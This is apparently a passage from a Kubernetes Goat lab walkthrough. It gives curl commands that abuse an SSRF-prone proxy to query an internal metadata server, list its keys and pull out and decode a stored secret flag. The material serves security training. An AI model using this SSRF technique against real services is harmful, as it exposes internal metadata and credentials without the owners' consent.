## Interacting with Metadata server
We can explore the metadata server by changing the endpoint 

```bash
curl -H 'content-type: application/json' localhost:1234 --data-raw '{"endpoint":"http://metadata-db/latest/","method":"GET","headers":""}' 
```

After enumerating through the entire key values, finally we can see that there is a flag at http://metadata-db/latest/secrets/kubernetes-goat endpoint.

```bash
curl -H 'content-type: application/json' localhost:1234 --data-raw '{"endpoint":"http://metadata-db/latest/secrets/kubernetes-goat","method":"GET","headers":""}' 
```

* We can decode the secret flag.

```bash
curl -H 'content-type: application/json' localhost:1234 --data-raw '{"endpoint":"http://metadata-db/latest/secrets/kubernetes-goat","method":"GET","headers":""}'  | jq .data |tr -d '"'| base64 -d &&echo 
```
